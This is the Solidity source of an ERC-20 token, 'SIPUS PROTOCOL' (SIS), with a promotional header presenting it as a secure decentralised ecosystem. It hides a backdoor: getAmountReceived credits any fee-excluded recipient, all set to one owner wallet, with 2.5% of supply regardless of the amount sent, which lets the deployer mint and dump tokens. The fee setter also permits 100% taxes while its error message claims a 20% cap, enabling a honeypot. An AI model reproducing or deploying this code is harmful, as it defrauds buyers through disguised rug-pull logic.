// SPDX-License-Identifier: MIT

/*
Sipus stands as a potent and decentralized ecosystem, prioritizing scalability, security, and global adoption via cutting-edge infrastructure.

Website: https://www.sipus.pro
Tools: https://app.sipus.pro
Twitter: https://twitter.com/sipus_protocol
Telegram: https://t.me/sipus_protocol
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SIS is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "SIPUS PROTOCOL";
    string private constant _symbol = "SIS";

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10 ** _decimals;

    IRouter router;
    address public pair;

    bool private tradingOpen = false;
    bool private swapOpen = true;
    bool private inswap;

    uint256 private sellCounts;
    uint256 private sellCountsForFeeSwap;

    uint256 private taxSwapMaxAmount = ( _totalSupply * 1000 ) / 100000;
    uint256 private taxSwapAt = ( _totalSupply * 10 ) / 100000;
    
    uint256 private lpDivideRate = 0;
    uint256 private mkDivideRate = 0;
    uint256 private burnDivideRate = 0;
    uint256 private devDivideRate = 100;

    uint256 private buyFee = 1500;
    uint256 private sellFee = 1500;
    uint256 private transferFee = 1500;
    uint256 private denominator = 10000;

    modifier lockEnter {inswap = true; _; inswap = false;}

    address internal devReceipt = 0x224692c843b9aCAE8D311B5e0ACA7F2065733bF0; 
    address internal marketingReceipt = 0x224692c843b9aCAE8D311B5e0ACA7F2065733bF0;
    address internal lpReceipt = 0x224692c843b9aCAE8D311B5e0ACA7F2065733bF0;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private maxTransaction = ( _totalSupply * 250 ) / 10000;
    uint256 private maxSellSize = ( _totalSupply * 250 ) / 10000;
    uint256 private maxWallet = ( _totalSupply * 250 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludeFromFees;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;

        isExcludeFromFees[lpReceipt] = true;
        isExcludeFromFees[devReceipt] = true;
        isExcludeFromFees[msg.sender] = true;
        isExcludeFromFees[marketingReceipt] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpDivideRate = _liquidity; mkDivideRate = _marketing; burnDivideRate = _burn; devDivideRate = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function getAmountReceived(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludeFromFees[recipient]) {return maxTransaction;}
        if(getFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnDivideRate > uint256(0) && getFees(sender, recipient) > burnDivideRate){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnDivideRate));}
        return amount.sub(feeAmount);} return amount;
    }


    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        maxTransaction = newTx; maxSellSize = newTransfer; maxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function startTrading() external onlyOwner {tradingOpen = true;}

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function checkIfTaxSwappable(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= taxSwapAt;
        bool aboveThreshold = balanceOf(address(this)) >= taxSwapMaxAmount;
        return !inswap && swapOpen && tradingOpen && aboveMin && !isExcludeFromFees[sender] && recipient == pair && sellCounts >= sellCountsForFeeSwap && aboveThreshold;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceipt,
            block.timestamp);
    }

    function swapBack(uint256 tokens) private lockEnter {
        uint256 _denominator = (lpDivideRate.add(1).add(mkDivideRate).add(devDivideRate)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpDivideRate).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpDivideRate));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpDivideRate);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(mkDivideRate);
        if(marketingAmt > 0){payable(marketingReceipt).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devReceipt).transfer(contractBalance);}
    }

    function getFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludeFromFees[sender] && !isExcludeFromFees[recipient]){require(tradingOpen, "tradingOpen");}
        if(!isExcludeFromFees[sender] && !isExcludeFromFees[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWallet, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= maxSellSize || isExcludeFromFees[sender] || isExcludeFromFees[recipient], "TX Limit Exceeded");}
        require(amount <= maxTransaction || isExcludeFromFees[sender] || isExcludeFromFees[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcludeFromFees[sender]){sellCounts += uint256(1);}
        if(checkIfTaxSwappable(sender, recipient, amount)){swapBack(taxSwapMaxAmount); sellCounts = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = amount;
        if (!isExcludeFromFees[sender]) {amountReceived = getAmountReceived(sender, recipient, amount);}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}